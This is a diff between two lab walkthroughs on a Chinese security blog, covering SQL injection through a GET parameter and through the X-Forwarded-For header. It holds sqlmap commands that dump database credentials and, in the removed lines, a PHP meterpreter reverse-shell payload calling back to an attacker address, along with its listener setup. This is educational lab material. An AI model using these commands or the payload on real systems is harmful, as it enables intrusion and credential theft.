@@ -6,33 +6,29 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href>
-  <title>SQL注入-GET参数 | Saw,Learnt,To think</title>
+  <title>SQL注入-X-Forwarded-For | Saw,Learnt,To think</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
+  <meta name="description" content="实验环境12攻击机 192.168.1.107靶场机 192.168.1.104">
 <meta name="keywords" content="CTF靶机系列">
 <meta property="og:type" content="article">
-<meta property="og:title" content="SQL注入-GET参数">
-<meta property="og:url" content="/2019/09/07/SQL注入-GET参数/index.html">
+<meta property="og:title" content="SQL注入-X-Forwarded-For">
+<meta property="og:url" content="/2019/09/07/SQL注入-X-Forwarded-For/index.html">
 <meta property="og:site_name" content="Saw,Learnt,To think">
-<meta property="og:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
+<meta property="og:description" content="实验环境12攻击机 192.168.1.107靶场机 192.168.1.104">
 <meta property="og:locale" content="en">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/1.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/2.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/3.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/4.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/5.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/6.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/7.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/8.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/9.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/10.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/11.png">
-<meta property="og:image" content="/2019/09/07/SQL注入-GET参数/12.png">
-<meta property="og:updated_time" content="2020-02-12T14:09:20.695Z">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/1.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/2.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/3.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/4.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/5.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/6.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/7.png">
+<meta property="og:image" content="/2019/09/07/SQL注入-X-Forwarded-For/8.png">
+<meta property="og:updated_time" content="2020-02-13T13:20:59.126Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="SQL注入-GET参数">
-<meta name="twitter:description" content="实验环境12攻击机	192.168.1.200靶场机	192.168.1.175">
-<meta name="twitter:image" content="/2019/09/07/SQL注入-GET参数/1.png">
+<meta name="twitter:title" content="SQL注入-X-Forwarded-For">
+<meta name="twitter:description" content="实验环境12攻击机 192.168.1.107靶场机 192.168.1.104">
+<meta name="twitter:image" content="/2019/09/07/SQL注入-X-Forwarded-For/1.png">
   
     <link rel="alternative" href="/atom.xml" title="Saw,Learnt,To think" type="application/atom+xml">
   
@@ -160,87 +156,62 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-SQL注入-GET参数" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-SQL注入-X-Forwarded-For" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      SQL注入-GET参数
+      SQL注入-X-Forwarded-For
     </h1>
   
 
         
-        <a href="/2019/09/07/SQL注入-GET参数/" class="archive-article-date">
-  	<time datetime="2019-09-07T02:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-07</time>
+        <a href="/2019/09/07/SQL注入-X-Forwarded-For/" class="archive-article-date">
+  	<time datetime="2019-09-07T03:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-07</time>
 </a>
         
       </header>
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机	192.168.1.200</span><br><span class="line">靶场机	192.168.1.175</span><br></pre></td></tr></table></figure>
+        <h3 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">攻击机 192.168.1.107</span><br><span class="line">靶场机 192.168.1.104</span><br></pre></td></tr></table></figure>
 
 <a id="more"></a>
 
 
 
-<h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><h4 id="①发现靶机"><a href="#①发现靶机" class="headerlink" title="①发现靶机"></a>①发现靶机</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.1.1/24</span><br></pre></td></tr></table></figure>
+<h3 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h3><h4 id="①扫描网段"><a href="#①扫描网段" class="headerlink" title="①扫描网段"></a>①扫描网段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -4 192.168.1.1/24</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/1.png" alt="1"></p>
-<h4 id="②nmap扫描"><a href="#②nmap扫描" class="headerlink" title="②nmap扫描"></a>②nmap扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap -A -T4 -v 192.168.1.175</span><br><span class="line">nmap -sV 192.168.1.175</span><br></pre></td></tr></table></figure>
+<p>发现靶机ip 192.168.1.104</p>
+<h4 id="②扫描端口"><a href="#②扫描端口" class="headerlink" title="②扫描端口"></a>②扫描端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#所有端口</span><br><span class="line">nmap -p- -T4 192.168.1.104</span><br><span class="line">#所有服务</span><br><span class="line">nmap -A -v -T4 192.168.1.104</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/2.png" alt="2"></p>
-<p>发现22端口和80端口开放</p>
-<h4 id="③Nikto扫描"><a href="#③Nikto扫描" class="headerlink" title="③Nikto扫描"></a>③Nikto扫描</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nikto -host 192.168.1.175</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/1.png" alt="1"></p>
+<h4 id="③探测敏感文件-目录"><a href="#③探测敏感文件-目录" class="headerlink" title="③探测敏感文件/目录"></a>③探测敏感文件/目录</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nikto -host nikto -host http://192.168.1.104</span><br><span class="line"></span><br><span class="line">dirb http://192.168.1.104</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/3.png" alt="3"></p>
-<h3 id="步骤二：信息分析"><a href="#步骤二：信息分析" class="headerlink" title="步骤二：信息分析"></a>步骤二：信息分析</h3><p>根据nmap和Nikto工具扫描得知有22端口、80端口以及管理员登入界面</p>
-<h3 id="步骤三：漏洞扫描工具利用"><a href="#步骤三：漏洞扫描工具利用" class="headerlink" title="步骤三：漏洞扫描工具利用"></a>步骤三：漏洞扫描工具利用</h3><h4 id="①OWSAP-ZAP工具利用"><a href="#①OWSAP-ZAP工具利用" class="headerlink" title="①OWSAP ZAP工具利用"></a>①OWSAP ZAP工具利用</h4><p><img src="/2019/09/07/SQL注入-GET参数/4.png" alt="4"></p>
-<p>发现管理员登入界面，存在SQL注入漏洞</p>
-<p><img src="/2019/09/07/SQL注入-GET参数/5.png" alt="5"></p>
-<h4 id="②利用sqlmap工具获取信息"><a href="#②利用sqlmap工具获取信息" class="headerlink" title="②利用sqlmap工具获取信息"></a>②利用sqlmap工具获取信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --batch</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/2.png" alt="2"></p>
+<h4 id="④漏洞分析工具-AVWS"><a href="#④漏洞分析工具-AVWS" class="headerlink" title="④漏洞分析工具- AVWS"></a>④漏洞分析工具- AVWS</h4><p>扫描：<a href="http://192.168.1.104" target="_blank" rel="noopener">http://192.168.1.104</a></p>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/3.png" alt="3"></p>
+<p>扫描到，X-Forwarded-For注入漏洞</p>
+<h3 id="步骤二：sqlmap使用"><a href="#步骤二：sqlmap使用" class="headerlink" title="步骤二：sqlmap使用"></a>步骤二：sqlmap使用</h3><h4 id="①获取数据库"><a href="#①获取数据库" class="headerlink" title="①获取数据库"></a>①获取数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.104&quot; --headers=&quot;X-Forwarded-For:*&quot; --dbs --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/6.png" alt="6"></p>
-<p>说明存在SQL注入漏洞</p>
-<p><strong>==sqlmap信息获取步骤==</strong></p>
-<ul>
-<li><p>获取数据库名</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; --dbs</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/4.png" alt="4"></p>
+<h4 id="②获取目标数据库的表"><a href="#②获取目标数据库的表" class="headerlink" title="②获取目标数据库的表"></a>②获取目标数据库的表</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.104&quot; --headers=&quot;X-Forwarded-For:*&quot; -D photoblog --tables --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/7.png" alt="7"></p>
-</li>
-<li><p>遍历浏览每个数据的表</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; --tables</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/5.png" alt="5"></p>
+<h4 id="③获取目标表的字段"><a href="#③获取目标表的字段" class="headerlink" title="③获取目标表的字段"></a>③获取目标表的字段</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.104&quot; --headers=&quot;X-Forwarded-For:*&quot; -D photoblog -T &quot;users&quot; --columns --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/8.png" alt="8"></p>
-</li>
-<li><p>遍历浏览表中的字段</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; --columns</span><br></pre></td></tr></table></figure>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/6.png" alt="6"></p>
+<h4 id="④获取目标字段的值"><a href="#④获取目标字段的值" class="headerlink" title="④获取目标字段的值"></a>④获取目标字段的值</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.104&quot; --headers=&quot;X-Forwarded-For:*&quot; -D photoblog -T &quot;users&quot; -C &quot;login,password&quot; --dump --batch</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/9.png" alt="9"></p>
-</li>
-<li><p>遍历浏览字段中的值</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.1.175/cat.php?id=3&quot; -D &quot;photoblog&quot; -T &quot;users&quot; -C &quot;login,password&quot; --dump</span><br></pre></td></tr></table></figure>
+<p>获得用户名及密码</p>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/7.png" alt="7"></p>
+<h4 id="⑤登入后台"><a href="#⑤登入后台" class="headerlink" title="⑤登入后台"></a>⑤登入后台</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.104/admin/login.php</span><br></pre></td></tr></table></figure>
 
-<p><img src="/2019/09/07/SQL注入-GET参数/10.png" alt="10"></p>
-<p>发现用户名：admin,  密码：P4ssw0rd</p>
-</li>
-</ul>
-<h3 id="步骤四：shell控制"><a href="#步骤四：shell控制" class="headerlink" title="步骤四：shell控制"></a>步骤四：shell控制</h3><h4 id="①生成shell"><a href="#①生成shell" class="headerlink" title="①生成shell"></a>①生成shell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.200 lport=4444 -f raw</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php /**/ error_reporting(0); $ip = &apos;192.168.1.200&apos;; $port = 4444; if (($f = &apos;stream_socket_client&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(&quot;tcp://&#123;$ip&#125;:&#123;$port&#125;&quot;); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;fsockopen&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f($ip, $port); $s_type = &apos;stream&apos;; &#125; if (!$s &amp;&amp; ($f = &apos;socket_create&apos;) &amp;&amp; is_callable($f)) &#123; $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) &#123; die(); &#125; $s_type = &apos;socket&apos;; &#125; if (!$s_type) &#123; die(&apos;no socket funcs&apos;); &#125; if (!$s) &#123; die(&apos;no socket&apos;); &#125; switch ($s_type) &#123; case &apos;stream&apos;: $len = fread($s, 4); break; case &apos;socket&apos;: $len = socket_read($s, 4); break; &#125; if (!$len) &#123; die(); &#125; $a = unpack(&quot;Nlen&quot;, $len); $len = $a[&apos;len&apos;]; $b = &apos;&apos;; while (strlen($b) &lt; $len) &#123; switch ($s_type) &#123; case &apos;stream&apos;: $b .= fread($s, $len-strlen($b)); break; case &apos;socket&apos;: $b .= socket_read($s, $len-strlen($b)); break; &#125; &#125; $GLOBALS[&apos;msgsock&apos;] = $s; $GLOBALS[&apos;msgsock_type&apos;] = $s_type; if (extension_loaded(&apos;suhosin&apos;) &amp;&amp; ini_get(&apos;suhosin.executor.disable_eval&apos;)) &#123; $suhosin_bypass=create_function(&apos;&apos;, $b); $suhosin_bypass(); &#125; else &#123; eval($b); &#125; die();</span><br></pre></td></tr></table></figure>
-
-<h4 id="②msfconsole利用shell，启动监听"><a href="#②msfconsole利用shell，启动监听" class="headerlink" title="②msfconsole利用shell，启动监听"></a>②msfconsole利用shell，启动监听</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload php/meterpreter/reverse_tcp</span><br><span class="line">set lhost 192.168.1.200</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<h4 id="③上传并执行shell"><a href="#③上传并执行shell" class="headerlink" title="③上传并执行shell"></a>③上传并执行shell</h4><p>登入以下网址：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.175/admin/login.php</span><br></pre></td></tr></table></figure>
-
-<p>用户名：admin,  密码：P4ssw0rd</p>
-<p><img src="/2019/09/07/SQL注入-GET参数/11.png" alt="11"></p>
-<p>点击shell.PHP后，会有如下所示：</p>
-<p><img src="/2019/09/07/SQL注入-GET参数/12.png" alt="12"></p>
+<p>账户：admin</p>
+<p>密码：P4ssw0rd</p>
+<p><img src="/2019/09/07/SQL注入-X-Forwarded-For/8.png" alt="8"></p>
 
       
 
@@ -341,7 +312,7 @@
     <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/09/07/SQL注入-GET参数/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=http:/2019/09/07/SQL注入-X-Forwarded-For/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -355,18 +326,18 @@
   
 <nav id="article-nav">
   
-    <a href="/2019/09/10/CTF-Web题-简单/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2019/09/07/路径遍历/" id="article-nav-newer" class="article-nav-link-wrap">
       <i class="icon-circle-left"></i>
       <div class="article-nav-title">
         
-          攻防世界-Web题-简单
+          路径遍历
         
       </div>
     </a>
   
   
-    <a href="/2019/08/26/FTP服务后门利用/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">FTP服务后门利用</div>
+    <a href="/2019/09/05/SQL注入-POST参数/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">SQL注入-POST参数</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -518,11 +489,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
+                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">渗透知识</a>
+                <a href="javascript:void(0)" class="js-tag color2">计算机小技巧</a>
               </li>
              
               <li class="article-tag-list-item">
